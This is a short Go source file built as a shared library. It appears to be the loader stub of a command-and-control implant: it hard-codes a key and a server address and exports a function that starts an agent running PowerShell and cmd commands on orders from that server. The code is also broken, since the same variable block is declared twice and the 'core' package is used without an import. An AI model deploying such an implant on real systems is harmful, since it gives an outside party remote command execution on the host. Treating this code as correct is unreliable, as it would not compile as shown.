package main

import "C"

var (
	key = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"
	defaultServer = "http://localhost:8888"
	defaultGroup = "my_group"
	defaultSleep = "60"
)

var (
	key = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"
	defaultServer = "http://localhost:8888"
	defaultGroup = "my_group"
	defaultSleep = "60"
)

//export VoidFunc
func VoidFunc() {
	core.Core(defaultServer, defaultGroup, defaultSleep, []string{"psh","cmd"}, false)
}

func main() {}